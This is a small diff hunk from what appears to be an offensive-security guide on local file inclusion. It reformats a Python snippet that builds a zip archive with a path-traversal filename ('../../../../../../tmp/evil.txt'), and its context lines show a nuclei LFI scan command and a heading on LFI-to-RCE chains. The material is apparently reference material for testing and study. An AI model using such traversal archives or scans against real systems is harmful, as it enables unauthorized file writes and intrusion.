@@ -72,8 +72,9 @@ nuclei -u TARGET_URL -t ~/nuclei-templates/vulnerabilities/generic/lfi*.yaml
 Malicious archive with path traversal in filenames:
 ```python
 import zipfile
-with zipfile.ZipFile('malicious.zip', 'w') as z:
-    z.writestr('../../../../../../tmp/evil.txt', 'pwned')
+
+with zipfile.ZipFile("malicious.zip", "w") as z:
+    z.writestr("../../../../../../tmp/evil.txt", "pwned")
 ```
 
 ### LFI to RCE Chains
